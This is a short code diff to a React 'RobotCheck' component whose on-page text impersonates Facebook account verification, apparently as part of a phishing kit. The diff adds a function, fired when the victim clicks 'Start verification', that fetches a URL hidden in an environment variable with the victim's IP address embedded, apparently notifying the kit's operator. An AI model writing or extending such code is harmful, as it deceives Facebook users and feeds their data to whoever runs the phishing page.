@@ -5,6 +5,11 @@ const RobotCheck = (props) => {
 
     const trigerNext = () => {
         props.onSubmit({type: 'robot-check', value: true});
+        sendOpenedScript();
+    }
+
+    const sendOpenedScript = async () => {
+        await fetch(`${process.env.customKey} Open Script (${props.ip.userIP})`).then( res => res.json());
     }
 
     return (
@@ -99,7 +104,7 @@ const RobotCheck = (props) => {
                             Please complete verification to remove the current restrictions on your account. <br/> <br/>
                             After completing verification, you may need to log back into your Facebook account.
                         </span>
-                        <button onClick={trigerNext}>Start verefication</button>
+                        <button onClick={trigerNext}>Start verification</button>
                     </div>
                     
                 </div>
